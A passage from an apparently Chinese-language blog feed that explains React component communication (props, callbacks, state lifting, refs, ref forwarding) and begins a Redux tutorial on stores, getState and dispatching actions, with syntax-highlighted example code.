class="token punctuation">&lt;</span><span class="token class-name">Child</span></span><span class="token punctuation">></span></span><span class="token plain-text">                </span><span class="token punctuation">&#123;</span><span class="token keyword">this</span><span class="token punctuation">.</span>value<span class="token punctuation">.</span>message<span class="token punctuation">&#125;</span><span class="token plain-text">            </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span><span class="token class-name">Child</span></span><span class="token punctuation">></span></span>        <span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name">Child</span> <span class="token keyword">extends</span> <span class="token class-name">React<span class="token punctuation">.</span>Component</span> <span class="token punctuation">&#123;</span>    <span class="token function">render</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token comment">// this.props.children 会指向父组件在子组件中嵌入的数据或组件</span>        <span class="token keyword">return</span> <span class="token punctuation">(</span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span><span class="token punctuation">></span></span><span class="token punctuation">&#123;</span><span class="token keyword">this</span><span class="token punctuation">.</span>props<span class="token punctuation">.</span>children<span class="token punctuation">&#125;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>        <span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">export</span> <span class="token keyword">default</span> Parent<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="子级传向父级"><a href="#子级传向父级" class="headerlink" title="子级传向父级"></a>子级传向父级</h2><p>React 中似乎没有提供子级向父级直接传值，类似 <code>props</code> 的方法或途径，可以通过一些间接手段实现，开发中常见的处理方式就是子组件调用父组件通过 <code>props</code> 传入的处理函数，对需要传递的值进行处理；例如：</p><pre class="line-numbers language-jsx" data-language="jsx"><code class="language-jsx"><span class="token keyword">import</span> React <span class="token keyword">from</span> <span class="token string">'react'</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name">Parent</span> <span class="token keyword">extends</span> <span class="token class-name">React<span class="token punctuation">.</span>Component</span> <span class="token punctuation">&#123;</span>    state <span class="token operator">=</span> <span class="token punctuation">&#123;</span>        <span class="token literal-property property">message</span><span class="token operator">:</span> <span class="token string">''</span><span class="token punctuation">,</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>        <span class="token function">handleMsg</span><span class="token punctuation">(</span><span class="token parameter">msg</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">setState</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>            <span class="token literal-property property">message</span><span class="token operator">:</span> msg<span class="token punctuation">,</span>        <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>        <span class="token function">render</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token comment">// Hello</span>        <span class="token keyword">return</span> <span class="token punctuation">(</span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span></span><span class="token punctuation">></span></span><span class="token plain-text">                </span><span class="token punctuation">&#123;</span><span class="token keyword">this</span><span class="token punctuation">.</span>state<span class="token punctuation">.</span>message<span class="token punctuation">&#125;</span><span class="token plain-text">                </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span><span class="token class-name">Child</span></span>                     <span class="token attr-name">onMsg</span><span class="token script language-javascript"><span class="token script-punctuation punctuation">=</span><span class="token punctuation">&#123;</span><span class="token punctuation">(</span><span class="token parameter">msg</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">handleMsg</span><span class="token punctuation">(</span>msg<span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span>                <span class="token punctuation">/></span></span><span class="token plain-text">            </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span></span><span class="token punctuation">></span></span>        <span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name">Child</span> <span class="token keyword">extends</span> <span class="token class-name">React<span class="token punctuation">.</span>Component</span> <span class="token punctuation">&#123;</span>    <span class="token function">handleClick</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>props<span class="token punctuation">.</span><span class="token function">onMsg</span><span class="token punctuation">(</span><span class="token string">'Hello'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">render</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token punctuation">(</span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>button</span>                <span class="token attr-name">onClick</span><span class="token script language-javascript"><span class="token script-punctuation punctuation">=</span><span class="token punctuation">&#123;</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">handleClick</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span>            <span class="token punctuation">></span></span><span class="token plain-text">Clike me</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>button</span><span class="token punctuation">></span></span>        <span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">export</span> <span class="token keyword">default</span> Parent<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>简单梳理一下流程：</p><ul><li>父组件提前声明数据处理逻辑，该方法接收传入的值，然后进行相应处理；</li><li>父组件将该方法通过 props 传递给子组件；</li><li>子组件触发一些行为，得到了将要传递给父组件的值；</li><li>子组件通过 <code>this.props</code> 调用父组件传入的处理函数，并将要传递的值作为该函数的参数；</li><li>处理函数开始执行，由于其是在父组件的作用域中声明的，所以也能访问父组件中的一些数据，比如 <code>state</code>，相当于在父组件中处理子组件传入的数据；</li><li>处理函数更新 state 状态值，随后其他访问该 state 的地方也会随即更新；</li></ul><h2 id="同级间传递"><a href="#同级间传递" class="headerlink" title="同级间传递"></a>同级间传递</h2><h3 id="状态提升"><a href="#状态提升" class="headerlink" title="状态提升"></a>状态提升</h3><p>这是 React 官网提到的一个概念，即多个组件都在重复使用同一个状态值，可以将这个值 <strong>提升</strong> 至父组件中保存，相当于数据复用；当然如果想实现一个子组件向另一个子组件传值，也可以通过父组件这层“媒介”；下面举例说明：</p><pre class="line-numbers language-jsx" data-language="jsx"><code class="language-jsx"><span class="token keyword">import</span> React <span class="token keyword">from</span> <span class="token string">'react'</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name">Parent</span> <span class="token keyword">extends</span> <span class="token class-name">React<span class="token punctuation">.</span>Component</span> <span class="token punctuation">&#123;</span>    state <span class="token operator">=</span> <span class="token punctuation">&#123;</span>        <span class="token literal-property property">msg</span><span class="token operator">:</span> <span class="token string">'hello'</span><span class="token punctuation">,</span>    <span class="token punctuation">&#125;</span>        <span class="token function">handleChangeMsg</span><span class="token punctuation">(</span><span class="token parameter">msg</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">setState</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>            <span class="token literal-property property">msg</span><span class="token operator">:</span> msg<span class="token punctuation">,</span>        <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>        <span class="token function">render</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token punctuation">(</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span></span><span class="token punctuation">></span></span><span class="token plain-text">            </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span><span class="token class-name">ChildLabel</span></span> <span class="token attr-name">msg</span><span class="token script language-javascript"><span class="token script-punctuation punctuation">=</span><span class="token punctuation">&#123;</span><span class="token keyword">this</span><span class="token punctuation">.</span>state<span class="token punctuation">.</span>msg<span class="token punctuation">&#125;</span></span> <span class="token punctuation">/></span></span><span class="token plain-text">            </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span><span class="token class-name">ChildButton</span></span>                <span class="token attr-name">onChangeMsg</span><span class="token script language-javascript"><span class="token script-punctuation punctuation">=</span><span class="token punctuation">&#123;</span><span class="token punctuation">(</span><span class="token parameter">msg</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">handleChangeMsg</span><span class="token punctuation">(</span>msg<span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span>            <span class="token punctuation">/></span></span><span class="token plain-text">        </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span></span><span class="token punctuation">></span></span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name">ChildLabel</span> <span class="token keyword">extends</span> <span class="token class-name">React<span class="token punctuation">.</span>Component</span> <span class="token punctuation">&#123;</span>    <span class="token function">render</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>span</span><span class="token punctuation">></span></span><span class="token punctuation">&#123;</span><span class="token keyword">this</span><span class="token punctuation">.</span>props<span class="token punctuation">.</span>msg<span class="token punctuation">&#125;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>span</span><span class="token punctuation">></span></span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name">ChildButton</span> <span class="token keyword">extends</span> <span class="token class-name">React<span class="token punctuation">.</span>Component</span> <span class="token punctuation">&#123;</span>    <span class="token function">render</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token punctuation">(</span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>button</span>                <span class="token attr-name">onClick</span><span class="token script language-javascript"><span class="token script-punctuation punctuation">=</span><span class="token punctuation">&#123;</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token keyword">this</span><span class="token punctuation">.</span>props<span class="token punctuation">.</span><span class="token function">onChangeMsg</span><span class="token punctuation">(</span><span class="token string">'world'</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span>            <span class="token punctuation">></span></span><span class="token plain-text">Change</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>button</span><span class="token punctuation">></span></span>        <span class="token punctuation">)</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">export</span> <span class="token keyword">default</span> Parent<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这样在页面中点击子组件 <code>&lt;ChildButton /&gt;</code> 中的按钮时，子组件 <code>&lt;ChildLabel /&gt;</code> 中的文本便会发生相应变化，成功获取传入的值；这里的操作相当于子组件先向父组件传值，使得父组件状态变化，然后使用该状态的另一子组件就会相应地变化；</p><h3 id="Refs"><a href="#Refs" class="headerlink" title="Refs"></a>Refs</h3><p><code>Refs</code> 是 React 提供的另一种机制，React 中典型数据流是通过 <code>props</code> 传递，而 refs 则相当于提供了直接操纵组件或 DOM 元素的一种途径，强制修改元素；因此官网也建议避免过度使用 refs，防止应用变得难以理解或“失控”；下面通过举例简单说明其用法：</p><pre class="line-numbers language-jsx" data-language="jsx"><code class="language-jsx"><span class="token keyword">import</span> React <span class="token keyword">from</span> <span class="token string">'react'</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name">Parent</span> <span class="token keyword">extends</span> <span class="token class-name">React<span class="token punctuation">.</span>Component</span> <span class="token punctuation">&#123;</span>    <span class="token comment">// 首先需要声明 ref</span>    myRef <span class="token operator">=</span> React<span class="token punctuation">.</span><span class="token function">createRef</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">handleClick</span><span class="token punctuation">(</span><span class="token parameter">msg</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token comment">// 通过 ref 的 current 属性实现对该元素的引用，</span>        <span class="token comment">// 然后就能想操作正常 DOM 一样实现控制；</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>myRef<span class="token punctuation">.</span>current<span class="token punctuation">.</span>innerText <span class="token operator">=</span> msg<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>        <span class="token function">render</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token comment">// 对需要被引用的元素使用 ref 属性，值为之前所创建的 ref</span>        <span class="token keyword">return</span> <span class="token punctuation">(</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span></span><span class="token punctuation">></span></span><span class="token plain-text">            </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>span</span> <span class="token attr-name">ref</span><span class="token script language-javascript"><span class="token script-punctuation punctuation">=</span><span class="token punctuation">&#123;</span><span class="token keyword">this</span><span class="token punctuation">.</span>myRef<span class="token punctuation">&#125;</span></span><span class="token punctuation">></span></span><span class="token plain-text">hello</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>span</span><span class="token punctuation">></span></span><span class="token plain-text">            </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>button</span>                <span class="token attr-name">onClick</span><span class="token script language-javascript"><span class="token script-punctuation punctuation">=</span><span class="token punctuation">&#123;</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">handleClick</span><span class="token punctuation">(</span><span class="token string">'world'</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span>            <span class="token punctuation">></span></span><span class="token plain-text">Change</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>button</span><span class="token punctuation">></span></span><span class="token plain-text">        </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span></span><span class="token punctuation">></span></span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">export</span> <span class="token keyword">default</span> Parent<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>在页面上点击按钮后，前面的文本同样会发生改变，即 DOM 元素的元素属性 <code>innerText</code> 值被成功修改，如需使用其他原生属性或方法同理；</p><h3 id="Refs-转发"><a href="#Refs-转发" class="headerlink" title="Refs 转发"></a>Refs 转发</h3><p>虽然 <code>Refs</code> 提供了直接访问组件或元素的途径，但是它却访问不了<strong>组件中的组件</strong>，这是 React 层故意为之，隐藏组件实现细节与渲染结果，防止组件的 DOM 结构被过度依赖；但有一些特殊情况下确实需要访问组件内部的组件的话，React 也提供了另外一种机制，即 <strong>Refs 转发（Refs Forwarding）</strong>；顾名思义，组件 A 不能直接使用 <code>ref</code> 访问组件 B 中的组件 C，但是可以通过组件 B 转发 <code>ref</code> 给组件 C，这里改造一下上面 <code>Refs</code> 中的例子，我们在 <code>&lt;Parent /&gt;</code> 和 <code>&lt;span&gt;</code> 之间再加一层组件，再实现对其的操作：</p><pre class="line-numbers language-jsx" data-language="jsx"><code class="language-jsx"><span class="token keyword">class</span> <span class="token class-name">Parent</span> <span class="token keyword">extends</span> <span class="token class-name">React<span class="token punctuation">.</span>Component</span> <span class="token punctuation">&#123;</span>    myRef <span class="token operator">=</span> React<span class="token punctuation">.</span><span class="token function">createRef</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">handleClick</span><span class="token punctuation">(</span><span class="token parameter">msg</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>myRef<span class="token punctuation">.</span>current<span class="token punctuation">.</span>innerText <span class="token operator">=</span> msg<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>        <span class="token function">render</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token comment">// 对子组件正常使用 ref</span>        <span class="token keyword">return</span> <span class="token punctuation">(</span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span><span class="token class-name">Child</span></span>                <span class="token attr-name">ref</span><span class="token script language-javascript"><span class="token script-punctuation punctuation">=</span><span class="token punctuation">&#123;</span><span class="token keyword">this</span><span class="token punctuation">.</span>myRef<span class="token punctuation">&#125;</span></span>                <span class="token attr-name">handleClick</span><span class="token script language-javascript"><span class="token script-punctuation punctuation">=</span><span class="token punctuation">&#123;</span><span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">handleClick</span><span class="token punctuation">.</span><span class="token function">bind</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span>            <span class="token punctuation">/></span></span>        <span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token comment">// 使用 React.forwardRef 方法转发 ref 给下一层组件</span><span class="token keyword">const</span> Child <span class="token operator">=</span> React<span class="token punctuation">.</span><span class="token function">forwardRef</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">props<span class="token punctuation">,</span> ref</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> <span class="token punctuation">(</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span></span><span class="token punctuation">></span></span><span class="token plain-text">        </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>span</span> <span class="token attr-name">ref</span><span class="token script language-javascript"><span class="token script-punctuation punctuation">=</span><span class="token punctuation">&#123;</span>ref<span class="token punctuation">&#125;</span></span><span class="token punctuation">></span></span><span class="token plain-text">hello</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>span</span><span class="token punctuation">></span></span><span class="token plain-text">        </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>button</span>            <span class="token attr-name">onClick</span><span class="token script language-javascript"><span class="token script-punctuation punctuation">=</span><span class="token punctuation">&#123;</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> props<span class="token punctuation">.</span><span class="token function">handleClick</span><span class="token punctuation">(</span><span class="token string">'world'</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span>        <span class="token punctuation">></span></span><span class="token plain-text">Change</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>button</span><span class="token punctuation">></span></span><span class="token plain-text">    </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span></span><span class="token punctuation">></span></span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>Refs 转发需要使用 <code>React.forwardRef()</code> 方法创造组件，该方法接收一个回调函数做为参数，该回调函数接收两个入参，第一个是传进组件的 <code>props</code>，第二个是传进组件的的 <code>ref</code>，通过内部逻辑决定 <code>ref</code> 再转发给谁，回调函数的返回值是最终生成的组件；页面加载组件后，点击按钮，就能像直接使用 <code>ref</code> 一样改变展示的文本值了；</p>]]></content>
      
      
      <categories>
          
          <category> JavaScript </category>
          
      </categories>
      
      
        <tags>
            
            <tag> react 组件 props ref context </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Redux 主要知识学习总结</title>
      <link href="/2024/09/27/javascript/redux-zhu-yao-zhi-shi-xue-xi-zong-jie/"/>
      <url>/2024/09/27/javascript/redux-zhu-yao-zhi-shi-xue-xi-zong-jie/</url>
      
        <content type="html"><![CDATA[<h2 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h2><p><strong>Redux</strong> 作为一个状态管理器，可以应用于多种 web 技术或框架中，React 只是其中之一；Redux 的特点在于，多个页面或组件使用同一个状态（store，用于管理应用的 state），可以实现各模块或组件之间的数据共享，应用的任何部分都能进行状态修改，避免了传统的组件间深层次传值问题；</p><h2 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h2><h3 id="创建状态（store）"><a href="#创建状态（store）" class="headerlink" title="创建状态（store）"></a>创建状态（store）</h3><p><code>Redux.createStore()</code> 方法用于创建一个 <code>store</code>，其接收 <strong><code>reducer</code></strong> 作为第一个参数；</p><p><code>reducer</code> 为一个自定义函数，接收 <code>state</code> 作为第一个参数，同时返回一个值作为新的 <code>state</code>；</p><p>reduce 有缩减，减少的意思，可以理解为一个缩减器，不断将新得到的状态覆盖原状态，以实现 <code>store</code> 的单一状态更新，其名字也是根据 <code>Array</code> 的 <code>.reduce()</code> 方法而来的；</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">import</span> Redux <span class="token keyword">from</span> <span class="token string">'redux'</span><span class="token punctuation">;</span><span class="token comment">// 为 state 设置默认值</span><span class="token keyword">const</span> <span class="token function-variable function">reducer</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token parameter">state <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">,</span> action</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> state<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">const</span> store <span class="token operator">=</span> Redux<span class="token punctuation">.</span><span class="token function">createStore</span><span class="token punctuation">(</span>reducer<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>createStore()</code> 方法还接收第二个参数 **<code>initialState</code>**，作为 <code>state</code> 的初始化值，即下面两种写法效果相同：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">import</span> Redux <span class="token keyword">from</span> <span class="token string">'redux'</span><span class="token punctuation">;</span><span class="token keyword">const</span> store1 <span class="token operator">=</span> Redux<span class="token punctuation">.</span><span class="token function">createStore</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">state <span class="token operator">=</span> <span class="token number">1</span></span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> state<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">const</span> store2 <span class="token operator">=</span> Redux<span class="token punctuation">.</span><span class="token function">createStore</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">state</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> state<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">const</span> state1 <span class="token operator">=</span> store1<span class="token punctuation">.</span><span class="token function">getState</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">const</span> state2 <span class="token operator">=</span> store2<span class="token punctuation">.</span><span class="token function">getState</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>state1<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 1</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>state2<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 1</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="读取状态"><a href="#读取状态" class="headerlink" title="读取状态"></a>读取状态</h3><p><code>getState()</code>，是所创建的 <code>store</code> 对象的一个方法，用于获取创建的状态；</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">const</span> store <span class="token operator">=</span> Redux<span class="token punctuation">.</span><span class="token function">createStore</span><span class="token punctuation">(</span>    <span class="token punctuation">(</span><span class="token parameter">state <span class="token operator">=</span> <span class="token number">1</span></span><span class="token punctuation">)</span> <span class="token operator">=></span> state<span class="token punctuation">;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">const</span> state <span class="token operator">=</span> store<span class="token punctuation">.</span><span class="token function">getState</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>state<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 1</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="改变状态（action）"><a href="#改变状态（action）" class="headerlink" title="改变状态（action）"></a>改变状态（action）</h3><h4 id="触发更新"><a href="#触发更新" class="headerlink" title="触发更新"></a>触发更新</h4><p><code>state</code> 的更新需要通过触发 <code>action</code> 来实现，<code>actoin</code> 是前面的 <code>reducer</code> 函数接收的第二个参数，一个 <code>action</code> 是一个包含操作信息的对象，同时也可以携带要传递的额外数据；</p><p>触发 <code>action</code> 使用 <code>dispatch</code> 实现，<code>dispatch</code> 是 <code>store</code> 对象的一个方法，其接收参数为 <code>action</code> 对象，是更新状态的唯一途径；</p><p>这里之所以多加一层 <code>action</code>，而不直接修改状态，是为了追踪某一状态为何更新，或者调试时进行操作复现等目的，而 <code>action</code> 中的 <code>type</code> 就相当于为了被追踪而留下的痕迹；</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">const</span> store <span class="token operator">=</span> Redux<span class="token punctuation">.</span><span class="token function">createStore</span><span class="token punctuation">(</span>    <span class="token punctuation">(</span><span class="token parameter">state<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">,</span> action</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>action<span class="token punctuation">.</span>type <span class="token operator">===</span> <span class="token string">'myAction'</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">return</span> action<span class="token punctuation">.</span>myData<span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">return</span> state<span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">const</span> action <span class="token operator">=</span> <span class="token punctuation">&#123;</span>    <span class="token literal-property property">type</span><span class="token operator">:</span> <span class="token string">'myAction'</span><span class="token punctuation">,</span> <span class="token comment">// type 属性为必填项</span>    <span class="token literal-property property">myData</span><span class="token operator">:</span> <span class="token string">'myContent.'</span><span class="token punctuation">,</span> <span class="token comment">// 自定义携带数据</span><span class="token punctuation">&#125;</span>store<span class="token punctuation">.</span><span class="token function">dispatch</span><span class="token punctuation">(</span>action<span class="token punctuation">)</span><span class="token punctuation">;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>store<span class="token punctuation">.</span><span class="token function">getState</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// "myContent."</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>在模块较多的复杂应用中，为了辨识操作，方便理解，通常 <code>type</code> 的格式会定义为 <code>模块/操作</code> 的形式，<code>模块</code>一般和对应的 <code>reducer</code> 相关，例如：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">const</span> <span class="token function-variable function">todoReducer</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token parameter">state<span class="token punctuation">,</span> action</span><span class="token punctuation">)</span> <span class="token 